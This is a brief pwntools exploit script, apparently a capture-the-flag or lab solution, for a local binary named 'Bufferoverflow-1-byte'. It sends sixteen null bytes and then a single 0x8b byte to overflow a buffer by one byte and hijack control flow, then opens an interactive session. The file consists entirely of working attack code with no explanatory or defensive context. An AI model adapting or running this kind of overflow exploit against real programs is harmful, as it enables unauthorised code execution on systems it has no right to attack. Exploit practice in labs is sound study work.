from pwn import*

p = process("./Bufferoverflow-1-byte")

payload = b"\x00"*0x10 + b"\x8b"

p.sendline(payload)
p.interactive()
